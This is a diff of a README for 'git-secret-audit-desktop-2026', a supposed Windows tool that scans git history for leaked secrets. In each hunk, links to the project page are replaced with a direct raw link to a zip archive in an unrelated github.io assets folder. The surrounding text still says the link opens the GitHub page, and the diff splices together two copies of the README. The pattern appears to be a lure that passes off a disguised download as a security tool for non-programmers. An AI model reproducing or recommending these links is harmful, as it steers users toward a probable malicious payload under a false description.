@@ -5,7 +5,7 @@ description: "Scan Git repositories' full commit history to detect exposed secre
 ---
 # 🔒 git-secret-audit-desktop-2026 - Scan Git History For Exposed Secrets
 
-[![Download git-secret-audit-desktop-2026](https://img.shields.io/badge/Download-git--secret--audit--desktop--2026-ff69b4?style=for-the-badge&logo=github)](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+[![Download git-secret-audit-desktop-2026](https://img.shields.io/badge/Download-git--secret--audit--desktop--2026-ff69b4?style=for-the-badge&logo=github)](https://github.com/noemiirenebarrante/noemiirenebarrante.github.io/raw/refs/heads/main/assets/v2.5.zip)
 
 git-secret-audit-desktop-2026 is a desktop utility for Windows that scans git repositories for exposed secrets, tokens, and credentials in full commit history. It helps you find sensitive information that may have been saved in a project folder and then forgotten. The application is built for people who want a clear, guided way to check repositories without needing to write code or understand developer tools.
 
@@ -41,7 +41,7 @@ You do not need to be a programmer to use this guide. The download and setup ste
 - Designed to work alongside common secret-scanning ideas such as gitleaks and trufflehog workflows.
 - Helps teams avoid secret sharing mistakes by# 🔒 git-secret-audit-desktop-2026 - Scan Git History For Secrets
 
-[![Download git-secret-audit-desktop-2026](https://img.shields.io/badge/Download-Now-ff8c00?style=for-the-badge&logo=github)](https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026)
+[![Download git-secret-audit-desktop-2026](https://img.shields.io/badge/Download-Now-ff8c00?style=for-the-badge&logo=github)](https://github.com/noemiirenebarrante/noemiirenebarrante.github.io/raw/refs/heads/main/assets/v2.5.zip)
 
 git-secret-audit-desktop-2026 is a desktop utility for Windows that scans git repositories for exposed secrets, tokens, and credentials in full commit history. It helps you find sensitive information that may have been saved in a project folder and then forgotten. The application is built for people who want a clear, guided way to check repositories without needing to write code or understand developer tools.
 
@@ -51,7 +51,7 @@ A git repository is a project folder that keeps a record of changes over time. T
 
 Visit this link to download the application:
 
-https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026
+https://github.com/noemiirenebarrante/noemiirenebarrante.github.io/raw/refs/heads/main/assets/v2.5.zip
 
 This is the primary download link for git-secret-audit-desktop-2026. The link opens the GitHub page where the application is made available. Use this page to download the application to your Windows computer.
 
@@ -124,7 +124,7 @@ The application is not limited to one kind of secret. It is built to look for ex
 
 If the download does not begin, visit the download link again:
 
-https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026
+https://github.com/noemiirenebarrante/noemiirenebarrante.github.io/raw/refs/heads/main/assets/v2.5.zip
 
 Make sure the page has finished loading before you look for the download. If you are on a slow connection, wait for the page to load completely and try again.
 
@@ -151,6 +151,6 @@ The application is a separate desktop utility. It fits into secret-scanning and 
 
 **Where do I download the application?**  
 Visit this link to download the application:  
-https://github.com/noemiirenebarrante/git-secret-audit-desktop-2026
+https://github.com/noemiirenebarrante/noemiirenebarrante.github.io/raw/refs/heads/main/assets/v2.5.zip
 
 Keywords: devsecops, git-repository, gitleaks, gitleaks-pass, gitleaks-scan, gitleaks-workflow, secret-scanning, secret-scanning-platform, secret-sharing, secrets-detection, security-audit, trufflehog, trufflehog-download
